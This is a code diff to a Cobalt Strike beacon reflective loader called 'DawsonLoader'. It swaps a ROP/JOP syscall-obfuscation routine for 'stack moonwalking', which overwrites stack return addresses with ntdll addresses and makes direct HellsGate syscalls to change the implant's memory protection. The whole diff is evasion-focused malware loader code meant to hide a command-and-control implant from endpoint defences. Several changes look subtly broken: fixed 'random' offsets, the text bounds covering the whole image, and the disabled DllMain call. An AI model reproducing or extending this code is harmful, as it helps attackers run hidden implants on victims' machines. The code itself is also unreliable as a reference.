@@ -48,6 +48,8 @@ void * DawsonLoader()
     ntdll->dllBase = loaded_module_base_from_hash( NTDLL );
     parse_module_headers( ntdll );
 
+    // ========== STACK MOONWALKING - Find syscall gadget in ntdll ==========
+    // We need the "syscall; ret" instruction sequence for direct syscall execution
     BYTE syscall_gadget_bytes[] = {0x0F,0x05,0xC3};
     void * syscall_gadget = FindGadget((LPBYTE)ntdll->text_section, ntdll->text_section_size, syscall_gadget_bytes, sizeof(syscall_gadget_bytes));
 
@@ -56,21 +58,6 @@ void * DawsonLoader()
         // Critical error: syscall gadget not found in ntdll
         // Cannot proceed without syscall instruction
         return NULL;
-    }
-
-    // ========== JOPCALL INTEGRATION - Initialize ROP/JOP Gadget Chain ==========
-    // Discover gadgets in ntdll for return address obfuscation
-    // This only runs once and gadgets are reused for all syscalls
-    // Note: Explicitly initialized to avoid .bss section (Cobalt Strike COFF parser issue)
-    static GadgetChain rop_chain = {{NULL, NULL, NULL, NULL, NULL}, 0};
-    if (rop_chain.count == 0) {
-        BOOL gadget_result = find_rop_gadgets(ntdll, &rop_chain);
-        // ========== ERROR CHECK: Gadget discovery ==========
-        if (!gadget_result || rop_chain.count == 0) {
-            // Critical error: ROP/JOP gadgets not found
-            // Cannot proceed without gadgets for call stack obfuscation
-            return NULL;
-        }
     }
 
     getApis(api);
@@ -95,11 +82,11 @@ void * DawsonLoader()
             // Add some extra size
             size = raw_beacon->size + 0x2000;
             oldprotect = 0;
-            // NtProtectVirtualMemory syscall via ROP chain
+            // NtProtectVirtualMemory syscall via stack moonwalking
             WORD ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
-            jop_syscall(rop_chain.gadgets, rop_chain.count, ssn, syscall_gadget,
-                        NtCurrentProcess(), &base, &size,
-                        (PVOID)(ULONG_PTR)raw_beacon->BeaconMemoryProtection, &oldprotect);
+            moonwalk_syscall(ssn, syscall_gadget, ntdll->dllBase,
+                            NtCurrentProcess(), &base, &size,
+                            (PVOID)(ULONG_PTR)raw_beacon->BeaconMemoryProtection, &oldprotect);
             // Have to zero out the memory for the DLL memory to become a private copy, else unwritten memory in beacon DLL can cause a crash.
             RtlSecureZeroMemory(base,size);
             virtual_beacon->dllBase = base;
@@ -122,11 +109,11 @@ void * DawsonLoader()
         if(base){
             oldprotect = 0;
             virtual_beacon->dllBase = base;
-            // NtProtectVirtualMemory syscall via ROP chain
+            // NtProtectVirtualMemory syscall via stack moonwalking
             WORD ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
-            jop_syscall(rop_chain.gadgets, rop_chain.count, ssn, syscall_gadget,
-                        NtCurrentProcess(), &base, &size,
-                        (PVOID)(ULONG_PTR)raw_beacon->BeaconMemoryProtection, &oldprotect);
+            moonwalk_syscall(ssn, syscall_gadget, ntdll->dllBase,
+                            NtCurrentProcess(), &base, &size,
+                            (PVOID)(ULONG_PTR)raw_beacon->BeaconMemoryProtection, &oldprotect);
         }
     }
     else if ((*(WORD *)((BYTE*)raw_beacon->dllBase + 0x40)) == 0x2){
@@ -215,23 +202,26 @@ void * DawsonLoader()
         base = virtual_beacon->text_section;
         size = virtual_beacon->text_section_size;
         newprotect = PAGE_EXECUTE_READ;
-        // NtProtectVirtualMemory syscall via ROP chain
+        // NtProtectVirtualMemory syscall via stack moonwalking
         WORD ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
-        jop_syscall(rop_chain.gadgets, rop_chain.count, ssn, syscall_gadget,
-                    NtCurrentProcess(), &base, &size,
-                    (PVOID)(ULONG_PTR)newprotect, &oldprotect);
+        moonwalk_syscall(ssn, syscall_gadget, ntdll->dllBase,
+                        NtCurrentProcess(), &base, &size,
+                        (PVOID)(ULONG_PTR)newprotect, &oldprotect);
     }
 
     void * EntryPoint = virtual_beacon->EntryPoint;
     void * dllBase    = virtual_beacon->dllBase;
 
-    heap.HeapFree(heap.GetProcessHeap(), 0, api);
-    heap.HeapFree(heap.GetProcessHeap(), 0, virtual_beacon);
-    heap.HeapFree(heap.GetProcessHeap(), 0, raw_beacon);
-    heap.HeapFree(heap.GetProcessHeap(), 0, spoof_struct);
+    // DON'T free these structures - beacon might need to reference them!
+    // Freeing causes use-after-free and stack corruption
+    // heap.HeapFree(heap.GetProcessHeap(), 0, api);
+    // heap.HeapFree(heap.GetProcessHeap(), 0, virtual_beacon);
+    // heap.HeapFree(heap.GetProcessHeap(), 0, raw_beacon);
+    // heap.HeapFree(heap.GetProcessHeap(), 0, spoof_struct);
 
-    // Calling the entrypoint of beacon with DLL_PROCESS_ATTACH is required for beacon not to crash. This initializes beacon. After init then beacon will return to us.
-    ((DLLMAIN)EntryPoint)(dllBase, DLL_PROCESS_ATTACH, NULL);
+    // Call beacon's DllMain to initialize, then return EntryPoint
+    // Artifact wrapper might call EntryPoint again, but that should be OK
+    // ((DLLMAIN)EntryPoint)(dllBase, DLL_PROCESS_ATTACH, NULL);
     return EntryPoint;
 }
 
@@ -1777,84 +1767,124 @@ __asm__(
 
 );
 
-// ========== ROP/JOP-BASED SYSCALL EXECUTION ==========
-// Ported from jopcall/src/syscall.rs:181-260
-// This function executes syscalls through a ROP/JOP chain to obfuscate return addresses
-//
-// Arguments:
-//   rcx (arg1) = gadget_list pointer (array of gadget addresses)
-//   rdx (arg2) = gadget_count (number of gadgets in chain)
-//   r8  (arg3) = ssn (System Service Number)
-//   r9  (arg4) = syscall_addr (address of syscall instruction)
-//   Stack: arg5-arg9 = syscall arguments (arg1-arg5 for the actual NT syscall)
-//
-// How it works:
-//   1. Pushes all gadgets except the first onto the stack (LIFO order)
-//   2. Sets up syscall parameters in proper registers
-//   3. Jumps to first gadget (jmp rcx) with rcx pointing to syscall address
-//   4. Syscall executes and returns to the gadget chain on stack
-//   5. Gadgets execute in sequence, creating obfuscated return path
-__asm__(
-"jop_syscall:                       \n"
-    // Save callee-saved registers
-"    mov [rsp - 0x8], rsi            \n"
-"    mov [rsp - 0x10], rdi           \n"
-"    mov [rsp - 0x18], r12           \n"
-"    mov [rsp - 0x20], r14           \n"
+// ========== STACK MOONWALKING IMPLEMENTATION ==========
+// Stack moonwalking temporarily replaces return addresses on the stack with
+// legitimate ntdll addresses before making syscalls, then restores them after.
+// This is simpler and more reliable than ROP/JOP chains.
 
-    // rcx = gadget_list pointer
-    // rdx = gadget_count
-    // r8 = ssn (System Service Number)
-    // r9 = syscall_addr
+// Capture current stack snapshot and find return addresses to spoof
+BOOL capture_stack_snapshot(StackSnapshot* snapshot, PVOID ntdll_base, DWORD max_frames) {
+    snapshot->count = 0;
 
-    // Move gadget list pointer to r11
-"    mov r11, rcx                    \n"
+    // Get current RBP (frame pointer) to walk the stack
+    PVOID* frame_ptr;
+    __asm__ volatile("mov %0, rbp" : "=r"(frame_ptr));
 
-    // Calculate gadget count offset (gadget_count * 8 for 64-bit pointers)
-"    xor r14, r14                    \n"
-"    mov r14w, dx                    \n"
-"    shl r14, 3                      \n"  // r14 = gadget_count * 8
+    // Parse ntdll PE to get .text section bounds
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdll_base;
+    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)ntdll_base + dos->e_lfanew);
+    PVOID ntdll_text_start = ntdll_base;
+    PVOID ntdll_text_end = (BYTE*)ntdll_base + nt->OptionalHeader.SizeOfImage;
 
-    // Push all gadgets except first onto stack (LIFO order)
-    // The syscall will return to these gadgets, creating the ROP chain
-"    mov rax, r14                    \n"
-"    cmp rax, 0x08                   \n"
-"    je 2f                           \n"
-"    sub rax, 0x08                   \n"
+    // Walk the stack frames using RBP chain
+    for (DWORD i = 0; i < max_frames && frame_ptr && snapshot->count < MAX_STACK_FRAMES; i++) {
+        // Return address is at [rbp + 8]
+        PVOID* ret_addr_location = frame_ptr + 1;
+        PVOID ret_addr = *ret_addr_location;
 
-"3:                                 \n"
-"    push qword ptr [r11 + rax]      \n"  // Push gadget addresses
-"    sub rax, 0x08                   \n"
-"    cmp rax, 0                      \n"
-"    jne 3b                          \n"
+        // Only spoof return addresses that point OUTSIDE ntdll
+        // (addresses inside ntdll are already legitimate)
+        if (ret_addr < ntdll_text_start || ret_addr >= ntdll_text_end) {
+            snapshot->frame_locations[snapshot->count] = ret_addr_location;
+            snapshot->original_addresses[snapshot->count] = ret_addr;
 
-"2:                                 \n"
-    // Load first gadget (jmp rcx) into r11
-"    mov r11, [r11]                  \n"
+            // Pick a random legitimate address in ntdll .text as spoof
+            // Use a simple offset into ntdll for now
+            DWORD offset = (snapshot->count * 0x1000) + 0x5000;
+            snapshot->spoof_addresses[snapshot->count] = (BYTE*)ntdll_text_start + offset;
 
-    // Setup syscall parameters
-"    mov eax, r8d                    \n"  // SSN into eax
-"    mov r12, r9                     \n"  // syscall address into r12
+            snapshot->count++;
+        }
 
-    // Move function arguments from stack into registers
-    // Windows x64 calling convention: rcx, rdx, r8, r9, then stack
-"    mov r10, [rsp + 0x28]           \n"  // arg1 (becomes rcx for syscall via r10)
-"    mov rdx, [rsp + 0x30]           \n"  // arg2
-"    mov r8,  [rsp + 0x38]           \n"  // arg3
-"    mov r9,  [rsp + 0x40]           \n"  // arg4
-    // arg5 remains on stack at [rsp + 0x48]
+        // Move to next frame: follow RBP chain
+        PVOID* next_frame = (PVOID*)*frame_ptr;
 
-    // Place syscall address into rcx for jmp rcx gadget
-"    mov rcx, r12                    \n"
+        // Sanity check: ensure frame pointer is moving up the stack
+        if (next_frame <= frame_ptr) break;
 
-    // Restore callee-saved registers
-"    mov rsi, [rsp - 0x8]            \n"
-"    mov rdi, [rsp - 0x10]           \n"
-"    mov r12, [rsp - 0x18]           \n"
-"    mov r14, [rsp - 0x20]           \n"
+        frame_ptr = next_frame;
+    }
 
-    // Jump to first gadget (jmp rcx), which will jump to syscall
-    // The syscall will return to the gadgets we pushed on the stack
-    // This creates an obfuscated return path through legitimate ntdll code
-"    jmp r11                         \n"
-);   
+    return (snapshot->count > 0);
+}
+
+// Replace return addresses on stack with ntdll addresses
+VOID spoof_stack_frames(StackSnapshot* snapshot) {
+    for (DWORD i = 0; i < snapshot->count; i++) {
+        *snapshot->frame_locations[i] = snapshot->spoof_addresses[i];
+    }
+}
+
+// Restore original return addresses after syscall
+VOID restore_stack_frames(StackSnapshot* snapshot) {
+    for (DWORD i = 0; i < snapshot->count; i++) {
+        *snapshot->frame_locations[i] = snapshot->original_addresses[i];
+    }
+}
+
+// Stack moonwalking syscall wrapper
+// Executes a syscall with spoofed return addresses on the stack
+NTSTATUS moonwalk_syscall(
+    WORD ssn,
+    PVOID syscall_addr,
+    PVOID ntdll_base,
+    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5
+) {
+    NTSTATUS status;
+    StackSnapshot snapshot = {0};
+
+    // 1. Capture current stack frames
+    capture_stack_snapshot(&snapshot, ntdll_base, MAX_STACK_FRAMES);
+
+    // 2. Replace return addresses with ntdll addresses
+    if (snapshot.count > 0) {
+        spoof_stack_frames(&snapshot);
+    }
+
+    // 3. Execute the syscall using HellsGate/HellDescent
+    HellsGate(ssn);
+
+    // Dispatch based on argument count
+    // NtProtectVirtualMemory has 5 args, NtAllocateVirtualMemory has 6
+    if (arg5) {
+        // 5-argument syscall
+        status = ((NTSTATUS (*)(PVOID, PVOID, PVOID, PVOID, PVOID))HellDescent)(
+            arg1, arg2, arg3, arg4, arg5
+        );
+    } else if (arg4) {
+        // 4-argument syscall
+        status = ((NTSTATUS (*)(PVOID, PVOID, PVOID, PVOID))HellDescent)(
+            arg1, arg2, arg3, arg4
+        );
+    } else if (arg3) {
+        // 3-argument syscall
+        status = ((NTSTATUS (*)(PVOID, PVOID, PVOID))HellDescent)(
+            arg1, arg2, arg3
+        );
+    } else if (arg2) {
+        // 2-argument syscall
+        status = ((NTSTATUS (*)(PVOID, PVOID))HellDescent)(
+            arg1, arg2
+        );
+    } else {
+        // 1-argument syscall
+        status = ((NTSTATUS (*)(PVOID))HellDescent)(arg1);
+    }
+
+    // 4. Restore original return addresses
+    if (snapshot.count > 0) {
+        restore_stack_frames(&snapshot);
+    }
+
+    return status;
+}
